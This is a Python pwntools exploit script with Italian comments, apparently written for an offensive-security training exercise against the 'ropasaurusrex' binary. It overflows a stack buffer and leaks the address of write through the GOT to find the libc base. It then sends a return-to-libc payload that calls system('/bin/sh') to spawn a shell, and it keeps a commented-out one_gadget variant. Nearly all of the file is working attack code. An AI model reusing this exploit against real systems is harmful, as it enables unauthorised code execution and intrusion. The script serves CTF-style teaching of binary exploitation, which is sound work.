from pwn import *
import time
context.update(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']

binary=ELF("./ropasaurusrex")
libc=ELF("./libc-2.35.so")   # ldd executable    patchelf --set-interpreter ./ld-2.35.so --replace-needed libc.so.6 ./libc-2.35.so ./ropasaurusrex

context.binary=binary

if "REMOTE" not in args:
    p = process("./ropasaurusrex")
    gdb.attach(p, """
        #b *0x0804841c 
        
        """)
    input("wait")
else:
    p = remote("bin.training.offdef.it", 2014)
             



what_to_write=binary.got["write"]      #indirizzo nella GOT della write 
where_to_jump=binary.plt["write"]      #indirizzo nel PLT della write

payload=b"A"*136
payload+=b"B"*4  #ebp 32 bit
payload+=p32(where_to_jump)            #eip
payload+=p32(binary.entry)             #ret  ricomincio il programma dalla funzione start
                                       #argomenti della write
payload+=p32(1)                        #what_to_write: indirizzo in cui si trova il valore della libc da leakare
payload+=p32(what_to_write)               #in uscita con la write voglio trovare indirizzo della libc 
payload+=p32(4)

p.sendline(payload)

leak=u32(p.recv(4))
print("Leak: "+hex(leak))  #posizione write   
write_offset=libc.symbols["write"]
libc_base=leak-write_offset

print("LIBC base: "+hex(libc_base))

#Exploit with system
bin_sh_offset=next(libc.search(b"/bin/sh")) 
print("BIN offset: "+hex(bin_sh_offset))
system_offset=libc.symbols["system"]
payload=b"A"*136
payload+=b"B"*4  #ebp
payload+=p32(libc_base + system_offset)
payload+=b"CCCC"  #indirizzo di ret non mi interessa in quanto apro la shell
payload+=p32(libc_base + bin_sh_offset)    #questo è l'argument di system


#Exploit with onegadget        #comando: one_gadget libc-2.35.so
                               #per leggere indirizzo .got.plt:  readelf -a libc-2.35.so | grep .got
#payload=b"A"*136
#payload+=b"B"*4  #ebp 32 bit
#payload=p64(libc_base + 0x172822) #eip#indirizzo del terzo gadget trovato tramite onegadget
#payload+=b"\x00\x00\x00\x00"       #devo soddisfare vincolo esp==null

#Exploit with ropping



p.sendline(payload)

p.interactive()